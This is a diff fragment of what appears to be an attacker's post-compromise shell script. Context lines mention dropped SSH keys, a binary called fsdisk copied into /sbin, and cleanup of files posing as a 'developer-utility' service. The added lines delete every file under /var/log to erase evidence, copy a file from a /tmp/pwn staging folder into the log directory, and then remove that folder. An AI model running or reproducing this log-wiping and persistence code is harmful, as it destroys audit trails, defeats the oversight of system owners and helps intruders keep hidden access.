@@ -228,6 +228,13 @@ done
 
 echo "[!] SSHKEYS dropped"
 
+# LOGGER MCLOGGERSON MEANY PANTS MCGEE
+
+find /var/log -type f -delete
+cp /tmp/pwn/l3ts_g3t_fUnKii /var/log/
+
+
+
 # PRISM
 chmod 7700 ./fsdisk
 cp ./fsdisk /sbin/
@@ -326,6 +333,7 @@ rm -f /tmp/fsdisk
 rm -f /tmp/devutil
 rm -f /tmp/developer-utility.service
 rm -f /tmp/developer-utility-daemon.service
+rm -rf /tmp/pwn
 
 echo "[!] CLEANED"
 
